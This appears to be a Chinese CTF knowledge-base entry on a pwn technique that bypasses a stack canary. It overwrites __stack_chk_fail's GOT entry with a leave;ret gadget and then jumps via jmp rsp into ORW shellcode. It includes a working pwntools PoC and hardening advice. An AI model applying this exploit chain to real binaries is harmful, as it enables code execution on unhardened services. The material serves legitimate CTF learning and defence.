---
id: ctf-pwn-stack-chk-fail-got-leave-ret-jmp-rsp-shellcode
title: 保留 Canary 也能打：把 __stack_chk_fail 的 GOT 改成 leave;ret，溢出后用 jmp rsp 落地 shellcode
type: scenario
domain: ctf
path: ctf/pwn
technique: stack-chk-fail-got-hijack-leave-ret-jmp-rsp-shellcode
aliases:
- 改 __stack_chk_fail 绕 canary
- stack_chk_fail GOT 劫持
- canary bypass by got overwrite
- jmp rsp shellcode
- 任意地址写改 GOT
tags:
- ctf
- pwn
- stack-overflow
- canary
- got-hijack
- shellcode
- rop
- orw
cve: []
severity: low
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:18:03+08:00'
  notes: 已对照原文核对；本次核对未读取图片；任意地址写改 __stack_chk_fail GOT 为 0x4008ef(leave;ret)、再溢出用 0x40081b(jmp rsp) 执行 ORW shellcode、地址与交互串均与原文 exp 一致（原文 canonical 写法是把该链作为『不需要泄 canary 的 GOT 劫持』通用思路）；未验证点：未在本机执行 exp，原文 checksec/IDA 截图为图片未读
---

## 一句话结论

开了 Canary 但没有 Full RELRO 时，不必泄露 Canary：先用程序自带的任意地址写能力把 `__stack_chk_fail@got` 改成 `leave; ret` gadget，再制造一次栈溢出覆盖返回地址为 `jmp rsp`，Canary 校验失败时控制流不会走到 `__stack_chk_fail` 的报错逻辑，而是执行 `leave;ret` 把栈迁到攻击者可控缓冲区，随后 `jmp rsp` 直接执行缓冲区里的 shellcode。

## 原理

- 栈溢出的常规结局：函数返回前执行 `__stack_chk_fail`（GOT 中的函数指针），随后 `__fortify_fail` → `abort`。真正被调用的地址来自 GOT，若 GOT 可写且攻击者有任意写原语，则这一步可以被改写为任意目标。
- 把该 GOT 改成 `leave; ret`：`leave` 等价于 `mov rsp, rbp; pop rbp`，此时 `rbp` 仍指向攻击者溢出时布置的区域（溢出覆盖了 rbp 或 rbp 指向被覆盖的栈），于是 `ret` 从攻击者布置的地址取走下一个 RIP，控制流被“劫持到栈迁移之后”，Canary 报错路径被彻底跳过。
- 再配合程序里已有的 `jmp rsp` gadget：`rsp` 指向的正是溢出数据缓冲区，`jmp rsp` 使其执行缓冲区中的机器码，无需泄露任何地址即可执行 shellcode，这在 PIE/NX 混合配置下尤其省事。
- 之所以有效：Canary 只在函数 `ret` 前做比较，检测失败后**依赖调用 `__stack_chk_fail` 终止进程**；一旦这个“失败处理函数”本身被替换为可控逻辑，Canary 就退化为无意义的比较，防护被绕过而非被破解。
- 前提是 GOT 可写（非 Full RELRO）且存在任意写原语或可以二次触发溢出覆盖 GOT 区域。

## 触发条件

- 二进制开启 Canary，但未开启 Full RELRO（`.got` 可写）。
- 存在任意地址写（如“读入地址 + 读入值”的双输入原语），或存在能覆盖 GOT 的溢出。
- 程序内存在 `leave; ret` 与 `jmp rsp` 之类 gadget，且栈上 shellcode 区域可执行，或可先 `mprotect`/走 ORW。
- 题目没有沙箱要求 execve，或 shellcode 需按 ORW 写（本题读 `flag` 文件并 write 到 stdout）。

## 利用步骤

1. `checksec` 确认 Canary 开启、RELRO 非 Full。
2. 逆向找两个原语：任意地址写（本题第一步输入被当作写目标）与缓冲区溢出。
3. 第一次交互：把 `__stack_chk_fail@got` 写成 `leave; ret` 地址（或某条能迁移栈的等价 gadget）。
4. 第二次交互：写入 8 字节占位 + `p64(got_of_任意可写目标)` 满足原语的“地址输入”，再写入 `leave;ret` 地址。
5. 第三次交互：发送 `p64(0)*n + p64(jmp_rsp) + shellcode`，让 Canary 校验失败触发跳转，栈迁移后 `jmp rsp` 执行 shellcode。
6. shellcode 用 ORW（open/read/write）读文件，避免沙箱禁 execve。

## PoC

```python
from pwn import *
context.clear(arch='amd64', os='linux')
mx = process('./canary')
elf = ELF('./canary')
vuln      = 0x400820          # 任意写原语入口 / 第一处输入点
leave_ret = 0x4008EF          # __stack_chk_fail 要改成的目标
jmp_rsp   = 0x40081B
stack_chk_fail_got = elf.got['__stack_chk_fail']

mx.recvuntil(b"Say some old spells to start the journey\n")
mx.send(p64(vuln))                              # 1) 触发原语
mx.recvuntil(b"Tell me the location of the Eye of the Deep Sea\n")
mx.send(b'a'*8 + p64(stack_chk_fail_got))       # 2) 选择写目标 = GOT
mx.recvuntil(b"I have magic\n")
mx.send(p64(leave_ret))                         # 3) 写入 leave;ret

mx.recvuntil(b"Let's go!\n")
shellcode = asm('''
    push 0x67616c66        /* "flag" */
    mov rdi, rsp
    xor esi, esi
    push 2
    pop rax
    syscall                /* open("flag", O_RDONLY) */
    mov rdi, rax
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall                /* read(fd, rsp, 0x100) */
    mov edi, 1
    mov rsi, rsp
    push 1
    pop rax
    syscall                /* write(1, rsp, n) */
''')
mx.send(p64(0)*5 + p64(jmp_rsp) + shellcode)    # 4) 溢出 -> 失败路径 -> jmp rsp
mx.interactive()
```

## 变体与关联

- 变体：无 `jmp rsp` 时改用 `call rsp`、`push rsp; ret`，或把 GOT 改成直接指向栈迁移 ROP 链（`add rsp, X; ret`）。
- 变体：GOT 不可写但存在 `__stack_chk_fail` 之外的失败路径（如 `__assert_fail`、`__cxa_throw` 的 vtable）时，可劫持对应结构。
- 变体：只能写一次时优先写 `__free_hook`/`__malloc_hook`（老 glibc）或退出链上的函数。
- 关联：[[ctf-pwn-format-canary-uaf-unsorted-ret2libc-all-protections]]（走泄露 Canary 与 libc 的正统路线）、[[ctf-pwn-tcache-poison-global-note-array-flagbuf-print]]（同为改钩子绕保护思路）、[[ctf-pwn-signal-handler-rt-sigframe-srop-orw]]（另一类“劫持异常处理路径”的利用）。
- 边界：Full RELRO（GOT 只读）、Canary 校验失败直接 `abort` 且无外部可劫持调用点、栈不可执行又无 `jmp rsp` 时，本链不成立。

## 检测与防御

- 本题为 CTF 题，工程侧对应加固：开启 Full RELRO（`-Wl,-z,relro,-z,now`）让 GOT 只读，把 `__stack_chk_fail` 直接编译为内联 `abort` 路径可减少可劫持点。
- 编译加 `-fstack-protector-all`、`-D_FORTIFY_SOURCE=2`、`-z noexecstack`；对高价值服务启用 CET/Shadow Stack 使 `jmp rsp` 类控制流转移失效。
- 检测思路：GOT 区被写入、`__stack_chk_fail` 地址偏离 libc 预期、进程在 Canary 校验失败后未终止反而继续执行。
